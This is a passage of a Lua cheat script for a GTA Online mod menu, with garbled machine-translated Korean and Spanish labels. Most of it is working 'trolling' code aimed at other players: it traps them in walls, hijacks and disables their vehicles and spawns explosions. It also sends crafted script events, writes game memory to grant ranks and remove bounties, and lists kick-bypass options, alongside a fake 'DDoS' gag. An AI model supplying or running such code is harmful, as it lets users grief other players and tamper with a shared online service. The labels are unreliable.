            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            util.yield(500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            util.yield(500)
            entities.delete_by_handle(veh)
        else
            util.toast(players.get_name(player_id).. " 차 안에 있는 게 아니라")
        end
    end)

    control_veh_cmd = menu.toggle(trolling, "플레이어의 차량 제어", {}, "지상 차량에서만 작동합니다.", function(toggle)
        control_veh = toggle

        while control_veh do 
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
            local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
            if not players.exists(player_id) then util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("멀리 떨어진 선수.")
                menu.set_value(control_veh_cmd, false)
            return end

            if class == 15 then
                util.toast("El 플레이어는 헬리콥터를 타고 있습니다.")
                menu.set_value(control_veh_cmd, false)
            break end
            
            if class == 16 then
                util.toast("El 플레이어는 비행기에 타고 있습니다.")
                menu.set_value(control_veh_cmd, false)
            return end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                if PAD.IS_CONTROL_PRESSED(0, 34) then
                    while not PAD.IS_CONTROL_RELEASED(0, 34) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                    while not PAD.IS_CONTROL_RELEASED(0, 35) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                    while not PAD.IS_CONTROL_RELEASED(0, 32) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                    while not PAD.IS_CONTROL_RELEASED(0, 33) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                        util.yield()
                    end
                end
            else
                util.toast("El 플레이어는 차에 있지 않습니다. :/")
                menu.set_value(control_veh_cmd, false)
            end
            util.yield()
        end
    end)

    menu.action(trolling, "DDoS", {}, "레즈비언니 uwu", function()
        util.toast("그는 공격을 가했다 " ..players.get_name(player_id))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("뭘 기대했는데?")
    end)


    menu.toggle_loop(friendly, "침묵의 god를 주다", {}, "무료로 제공되는 메뉴얼을 발견하지 못할 것입니다.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), true, true, true, true, true, false, false, true)
        end, function() 
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), false, false, false, false, false, false, false, false)
    end)

    menu.action(friendly, "25레벨 달기", {}, "레벨 25를 부여합니다. (Thx jinx <3).", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x5, 0, 1, 1, 1})
        for i = 0, 9 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x0, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x1, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x3, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0xA, i, 1, 1, 1})
        end
        for i = 0, 1 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x6, i, 1, 1, 1})
        end
        for i = 0, 19 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, i, 1, 1, 1})
        end
        for i = 0, 99 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x9, i, 1, 1, 1})
            util.yield()
        end
    end)

    menu.toggle_loop(friendly, "카지노 토큰을 주다.", {"dropchips"}, "3주 동안 테스트하고 안전해 보이지만 언제든지 탐지할 수 있습니다.", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(p)
        STREAMING.REQUEST_MODEL(card)
        while not STREAMING.HAS_MODEL_LOADED(card) do
            STREAMING.REQUEST_MODEL(card)
            util.yield()
        end
        OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, card, true, false) --spawn casino chips
        if not STREAMING.HAS_MODEL_LOADED(card) then
            util.toast("모델을 충전할 수 없었다")
        end
    end)

    menu.action(friendly, "생명을 불어넣다", {}, "", function()
        menu.trigger_commands("autoheal"..players.get_name(player_id))
    end)

    menu.action(friendly, "범죄 피해를 입히다.", {}, "항상 도전해 보세요.", function()
        local fcartable = {}

        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defz = c.z
        STREAMING.REQUEST_MODEL(expcar)
        while not STREAMING.HAS_MODEL_LOADED(expcar) do
            STREAMING.REQUEST_MODEL(expcar)
            util.yield()
        end
        STREAMING.REQUEST_MODEL(floorbr)
        while not STREAMING.HAS_MODEL_LOADED(floorbr) do
            STREAMING.REQUEST_MODEL(floorbr)
            util.yield()
        end
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(c.x, c.y)
            util.yield()
        until success
        floorcoords = floorcoords - 100
        c.z = floorcoords
        local floorrigp = entities.create_object(floorbr, c)
        c.z = defz
        c.z = c.z - 95 
        for i = 1, 22 do
            fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) 
        end
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) 
        util.yield(500)
        entities.delete_by_handle(floorrigp)
        util.yield(1000)
        
        for i = 1, #fcartable do
            entities.delete_by_handle(fcartable[i]) 
            fcartable[i] = nil
        end
    end)

    menu.toggle_loop(friendly, "체크포인트를 획득", {}, "챌린지 체크포인트를 획득할 수 있습니다.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        if PED.IS_PED_IN_ANY_VEHICLE(p) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            RequestControl(veh)
            local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
            local cdblip = HUD.GET_BLIP_COORDS(dblip)
            ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
            util.yield(1500)
        else
            util.toast(players.get_name(player_id).. " 차량 안에 있어야 합니다.")
        end
    end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Vehicle


    menu.action(vehicle, "차량 수리", {}, "그들의 차량을 수리한다.", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
            util.toast(players.get_name(player_id) .. " 수리된 차량")
        else
            util.toast(" 차량을 제어할 수 없거나 플레이어가 차량에 있지 않습니다.")
        end
    end)

    menu.action(vehicle, "차량을 분해하다.", {}, "그것은 스탠드보다 낫다", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    menu.action(vehicle, "루프 차량을 비활성화합니다.", {}, "그것은 스탠드보다 낫다", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    menu.action(vehicle, "차량을 분해하다. V2", {}, "스탠드당 잠글 수 없음 '10/02'", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
            util.toast(players.get_name(player_id) .. " 엔진 고장")
        else
            util.toast("차량을 제어할 수 없거나 플레이어가 차량에 있지 않습니다.")
        end
    end)

    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- Other

    menu.action(otherc, "마르카 델 게이머", {}, "플레이어가 가지고 있는 마크를 지도에 표시해야 합니다.", function()    
        local playerw = players.get_waypoint(player_id)
        for i = 1, 5 do
            HUD.REFRESH_WAYPOINT()
        end
        HUD.SET_NEW_WAYPOINT(playerw.x, playerw.y, false)
        util.yield(2000)
        util.toast("La marca del jugador ya deberia estar en el mapa.")
        util.yield(500)
        util.toast("Tal vez no tenga marca si no sale.")

    end)



end)




menu.slider(world, "지역 투명성", {"transparency"}, "지금은 잘 안 되네요, 나중에 고쳐보도록 하겠습니다", 0, 100, 100, 20, function(value)
    if value > 80 then
        ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
    else
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
    end
end)

local s_forcefield_range = 10
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(world, "전쟁터", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)

menu.action(world, "지역 청소", {"rcleararea"}, "그 지역의 모든 것을 청소해라", function(on_click)
    clear_area(clear_radius)
    util.toast('청정지역:3')
end)

menu.action(world, "청소 문도", {"rclearworld"}, "그것은 말 그대로 NPC, 자동차, 물건, 볼 등을 포함한 그 지역의 모든 것을 청소한다.", function(on_click)
    clear_area(1000000)
    util.toast('깨끗한 세상 :3')
end)

menu.slider(world, "클렌징 라디오", {}, "청소용 라디오", 100, 10000, 100, 100, function(s)
    radius = s
end)


--------------------------------------------------------------------------------------------------------------------------------
--Detecciones
menu.toggle_loop(detections, "무적모드", {}, "무적모드가 감지되면 나올 것이다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(player_id) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior then
                util.draw_debug_text(players.get_name(player_id) .. " 고드모드가 있습니다.")
                break
            end
        end
    end 
end)

menu.toggle_loop(detections, "무적차량", {}, "차 안에서 무적모드가 발견되면 나올 것이다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior then
                    util.draw_debug_text(players.get_name(player_id) .. " 그는 무적차량을 타고 있다")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(detections, "모드 무기", {}, "혹시 휘파람을 불지 않은 총이 있다면 말해보세요.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(player_id) .. " 그는 무장을 하고 있다")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "모드 자동차", {}, "그가 모드 차를 가지고 있다면 나오라", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " 그는 개조된 차를 가지고 있다")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "실내 무기", {}, "실내에서 무기를 사용하면 나올 것입니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " Tiene un arma en interior")
            break
        end
    end
end)

menu.toggle_loop(detections, "해커입니다", {}, "플레이어가 밴을 할 것인지 여부를 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
            util.draw_debug_text(players.get_name(player_id) .. " 그는 곧 쓰러질 것이다 :u, razon:", reason)
            break
        end
    end
end)

menu.toggle_loop(detections, "빨리 달려라", {}, "더 빨리 달렸는지 감지해", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and get_interior_player_is_in(player_id) == 0 and get_transition_state(player_id) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(player_id) .. " 유징 슈퍼런")
            break
        end
    end
end)

menu.toggle_loop(detections, "노클립", {}, "플레이어가 공중부양하는지 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(player_id)
        util.yield()
        local currentpos = players.get_position(player_id)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(player_id)
        and get_interior_player_is_in(player_id) == 0 and get_transition_state(player_id) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(player_id) .. " 그는 녹음을 하고 있다.")
            break
        end
    end
end)

menu.toggle_loop(detections, "스펙터클", {}, "그가 당신을 유혹하는지 아니면 다른 사람을 유혹하는지 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not util.is_session_transition_active() and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(player_id)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 20.0 then
                    util.toast(players.get_name(player_id) .. " 당신을 보고 있어요.")
                    break
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "텔레포트", {}, "플레이어가 텔레포트되는지 여부를 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(player_id)
            util.yield(1000)
            local currentpos = players.get_position(player_id)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
                    util.toast(players.get_name(player_id) .. " 방금 텔레포트를 통해")
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "스마트 킥 'Test'", {}, "그는 그들이 매우 빨리 회의에서 누군가를 추방하는 것에 투표하는지 감지하고 경고합니다.  스탠드업 스마트 킥으로 더 잘 알려져 있습니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local kickowner = NETWORK.NETWORK_SESSION_GET_KICK_VOTE(player_id)
        local kicked = NETWORK.NETWORK_SESSION_KICK_PLAYER(player_id)
        if kicked then
            util.draw_debug_text(players.get_name(player_id) .. " 플레이어는", kicked, "다음과 같은 이유로 킥킥거렸습니다.", kickowner)
            break
        end
    end
end)
--------------------------------------------------------------------------------------------------------------------------------
--Online

menu.toggle_loop(online, "전념하는 SH", {}, "당신은 하우스 스크립트에 중독되어 있어요.", function()
    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end)

menu.toggle(online, "안티 채팅", {}, "채팅 메시지를 작성할 때 다른 플레이어가 볼 수 없도록 합니다.", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

local maxHealth <const> = 328
menu.toggle_loop(online, ("푸에라 델 레이더 무에르토"), {"undeadotr"}, "", function()
	if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth)
end)

menu.toggle_loop(online, "라유니온을 받아들임", {}, "자동으로 결합하는 화면을 받아들이게 됩니다.", function() -- credits to jinx for letting me steal this
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(200)
    end
end)

menu.toggle(online, "열병기 'Test'", {}, "그는 당신의 모든 무기를 열쇠로 장식합니다. E", function()
    local thermal_command = menu.ref_by_path("Game>Rendering>Thermal Vision", 33)
    if PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_PED_ID()) then
        if PAD.IS_CONTROL_JUST_PRESSED(38, 38) then
            if not GRAPHICS.GET_USINGSEETHROUGH() then
                menu.trigger_command(thermal_command, "on")
                GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(50)
            else
                menu.trigger_command(thermal_command, "off")
                GRAPHICS.SET_SEETHROUGH(false)
                GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1) --default value is 1
            end
        end
    elseif GRAPHICS.GET_USINGSEETHROUGH() then
        menu.trigger_command(thermal_command, "off")
        GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
    end
end)

menu.toggle(online, "냉혈한 사람 'Test'", {}, "열 신호를 제거합니다. 어떤 플레이어는 여전히 당신을 볼 수 있습니다.", function(toggle)
    local player = PLAYER.PLAYER_PED_ID()
    if toggle then
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 0)
    else
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 1)
    end
end)

joining = false
menu.toggle(online, "플레이어 알림", {}, "선수가 세션에 들어갈 때 경고합니다.", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

local maxps = menu.list(online, "호스트 도구", {}, "")

menu.slider(maxps, "맥스 선수", {}, "로비에서 최대 게이머는 호스트일 때만 작동합니다.", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(0))
    end
end)
menu.slider(maxps, "시청자 맥스", {}, "최대 시청자는 호스트일 때만 작동합니다.", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(4))
    end
end)

--menu.toggle(online, "Tiempo Real", {}, "Hace tu juego concordar con la hora actual de tu ubicacion.", function(toggle)
--    irlTime = toggle
--    local smoothTimeOn = menu.get_value(smoothTransitionCommand) == 1
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--    util.create_tick_handler(function()
--        menu.trigger_command(setClockCommand, os.date("%H:%M:%S"))
--        return irlTime
--    end)
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--end)

local servicios = menu.list(online, "서비스", {}, "")

menu.action(servicios, "헬리를 부탁하다", {}, "당신의 위치로 고급 헬리콥터를 요청하십시오.", function(on_toggle)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and
	not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
        memory.write_int(memory.script_global(2815059 + 876), 1)
        memory.write_int(memory.script_global(2815059 + 883), 1)
	end
end)

menu.action(servicios, "레페펜사를 제거하다.", {}, "", function()
    if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
        memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
        memory.write_int(memory.script_global(2359296 + 1 + 5149 + 13), 2880000)
    else
        util.toast("너는 보상이 없다 :/")
    end
end)

recovery = menu.list(online, "리커버리 'Test'", {}, "")


--menu.action(recovery, "Dar M16", {""}, "", function()
--    memory.write_int(memory.script_global(262145 + 32775), 1)
--end)

local coleccionables = menu.list(recovery, "수집품", {}, "")

menu.click_slider(coleccionables, "테이프", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x0, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "히든 카체스", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x1, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "컵/보물", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x2, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "라디오 안테나", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x3, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "USBs", {""}, "", 0, 19, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x4, i, 1, 1, 1})
end)

menu.action(coleccionables, "난파선", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x5, 0, 1, 1, 1})
end)

menu.click_slider(coleccionables, "매몰", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x6, i, 1, 1, 1})
end)

menu.action(coleccionables, "할로윈 티셔츠", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x7, 1, 1, 1, 1})
end)

menu.click_slider(coleccionables, "손전등", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x8, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "라마 유기물", {""}, "", 0, 99, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x9, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "융크 에너지 자유 비행", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0xA, i, 1, 1, 1})
end)

local bypasskick = menu.list(online, "바이패스 킥", {}, "만약 그들이 당신을 막고 있다면, 회의에 들어가기 위해 모든 수단을 사용할 수 있는 옵션들.")

menu.divider(bypasskick, "일반 방법")

